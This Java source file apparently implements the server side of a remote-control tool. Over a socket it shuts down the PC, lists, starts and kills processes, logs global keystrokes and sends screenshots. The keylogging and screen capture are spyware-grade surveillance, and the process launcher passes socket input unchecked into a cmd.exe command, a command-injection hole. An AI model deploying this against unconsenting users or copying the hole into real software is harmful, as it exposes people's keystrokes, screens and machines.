
package Server;

import java.awt.AWTException;
import java.awt.HeadlessException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Socket;
import java.util.Optional;
import javax.imageio.ImageIO;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import java.nio.file.Files;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author LENOVO
 */
public class ActiveServer {
    
    Socket sending = null;
    DataOutputStream dataOutput = null;
    DataInputStream dataInput = null;
    JFrame frame = new JFrame();
    PrintText keystrokes = new PrintText();
    
    String Host = null;
  
    public ActiveServer(Socket s) throws IOException{
        
        this.sending = s;
        dataOutput = new DataOutputStream(s.getOutputStream());
        dataInput = new DataInputStream(s.getInputStream());
    }
    
    public ActiveServer(String Host, Socket s) throws IOException{
        
        this.Host = Host;
        this.sending = s;
        dataOutput = new DataOutputStream(s.getOutputStream());
        dataInput = new DataInputStream(s.getInputStream());
    }
    
    
    public void shutdown() throws IOException
    {
        JOptionPane.showMessageDialog(frame,"Your PC will shut down after 45s.","SHUT DOWN",JOptionPane.INFORMATION_MESSAGE);
        String command = "shutdown -s -t 25";
        Runtime.getRuntime().exec(command);
        System.exit(0);
    }
    
    public void taskKill() throws IOException 
    {
      
        String pid = dataInput.readUTF();

        Optional<ProcessHandle> OproH;


        OproH = ProcessHandle.of( Integer.parseInt(pid));
        if(OproH.isEmpty())
        {
            dataOutput.writeUTF("Kill ERROR!");
            dataOutput.flush();
        }
        else{
            ProcessHandle proH = OproH.orElseThrow();
            try{
                proH.destroyForcibly();
                dataOutput.writeUTF("Kill " + pid + " successfull.");
                dataOutput.flush();
            }
            catch(HeadlessException | IOException ex){
                dataOutput.writeUTF("Kill ERROR!");
                dataOutput.flush();
            }
        }                         
    }


    
    public void taskStart() throws IOException 
    {       
        String pro = dataInput.readUTF();

        try{
             String command = "cmd.exe /c start " + pro;
            Process proc = Runtime.getRuntime().exec(command);

            if(proc.isAlive())
            {
                String response = "Started " + pro;
                dataOutput.writeUTF(response);
                dataOutput.flush();
            }   
            else{
                dataOutput.writeUTF("Start ERROR!");
                dataOutput.flush(); 
            }
        }
        catch(HeadlessException | IOException ex){
            dataOutput.writeUTF("Start ERROR!");
            dataOutput.flush();
        }                                     


    }
    
    public void process() throws IOException 
    {
        String str = "";
        Runtime rt = Runtime.getRuntime();
        while (true)
        {
            try
            {
                str = dataInput.readUTF();
            }
            catch (IOException ex)
            {
                str = "QUIT";
            }
            System.out.println(str);
            switch(str)
            {
                case "Load processes running" -> {
                    String line;
                    Process proc = rt.exec("tasklist /fo csv /nh");
                    BufferedReader input = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                    while ((line = input.readLine()) != null) {
                        dataOutput.writeUTF(line);
                        dataOutput.flush();
                    }
                    dataOutput.writeUTF("");
                    dataOutput.flush();

                    input.close();
                }
                case "Start process" -> {
                    taskStart();
                }
                case "Kill process" -> {
                    taskKill();
                }
                case "QUIT" -> {
                    return;
                }
                default -> {
                    return;
                }

            }
        }        
    }
    
    public static boolean isNumeric( String cs) {
        if (cs.isEmpty()) {
            return false;
        }
        int sz = cs.length();
        for (int i = 0; i < sz; i++) {
            if (!Character.isDigit(cs.charAt(i))) {
                return false;
            }
        }
        return true;
    }

    public void apprunning() throws IOException 
    {
        String str = "";
        Runtime rt = Runtime.getRuntime();
        while (true)
        {
            try
            {
                str = dataInput.readUTF();
            }
            catch (IOException ex)
            {
                str = "QUIT";
            }

            switch(str)
            {
                case "Load app running":
                {
                    Process proc1 = rt.exec("powershell.exe /c gps | where {$_.mainwindowhandle -ne 0}  | select id");
                    String s = "";
                    BufferedReader input1 = new BufferedReader(new InputStreamReader(proc1.getInputStream()));
                    while( (s = input1.readLine())!=null)
                    {                           
                        s = s.replaceAll(" ", "");
                        if( isNumeric(s))
                        {
                        int b = Integer.parseInt(s);
                        Process proc = rt.exec("tasklist /v /fi \"PID eq "+b+"\" /fo csv /nh");
                        BufferedReader input = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                        String line = input.readLine();
                        dataOutput.writeUTF(line);
                        dataOutput.flush();

                        input.close();
                        } 
                    }               
                    dataOutput.writeUTF("");
                    dataOutput.flush();

                    input1.close();
                }
                    break;

                case "Start app" :
                {
                    taskStart();
                }
                break;
                case "End app":
                {
                    taskKill();
                }
                    break;
                case "QUIT":    return;
                default:  return;

            }
        }        
    }

    
    public void unHook(){
        GlobalScreen.removeNativeKeyListener(keystrokes.getKeyBoard());
    } 
    
    public void hookKey() throws IOException{
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
       if (!GlobalScreen.isNativeHookRegistered()) {
            try {
                GlobalScreen.registerNativeHook();
            } catch (NativeHookException ex) {
                Logger.getLogger(ActiveServer.class.getName()).log(Level.SEVERE, null, ex);
                ex.printStackTrace();
            }
        }
        GlobalScreen.addNativeKeyListener(keystrokes.getKeyBoard());
    }
    
    

    public void keystrokes() throws IOException
    {
        String str = "QUIT";

        while (true)
        {
            try
            {
                str = dataInput.readUTF();
            }
            catch (IOException ex)
            {
                str = "QUIT";
            }
            switch(str)
            {
                case "HOOK":
                {                    
                    hookKey();
                    break;
                }
                case "UNHOOK" :
                {
                    unHook();
                    break;
                }
                    
                case "PRINT":
                {             
                    String text = keystrokes.printKey();
                    dataOutput.writeUTF(text);
                    dataOutput.flush();
                    break;                    
                }
                    
                case "DELETE" :
                {
                    keystrokes.getKeyBoard().clear();
                    break;
                }
                    
                case "QUIT":                        
                {   
                    unHook();
                    keystrokes.getKeyBoard().clear();
                    return;
                }
                default: 
                    unHook();
                    return;

            }
        }
        
  
    }


      public void Screen() throws IOException, InterruptedException, AWTException
     {
           
               //Thread.sleep(200);
                Robot r = new Robot();
                
                String path = "D:// Shot.jpg";
                File file = new File(path);
                file.delete();
                Rectangle capture = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
                
                BufferedImage CImage = r.createScreenCapture(capture);
                
                ImageIO.write(CImage, "jpg", file);
                
                byte b[] = Files.readAllBytes(file.toPath());
                dataOutput.writeInt(b.length);
                dataOutput.flush();
                dataOutput.write(b);
                dataOutput.flush();
                
     }
     
     
     public void ScreenShot() throws IOException, InterruptedException, AWTException
     {
         
            Screen();
               
     }
     
     
      public void exit() throws IOException
      {
          sending.close();
          dataInput.close();
          dataOutput.close();
          System.exit(0);
      }
         
}

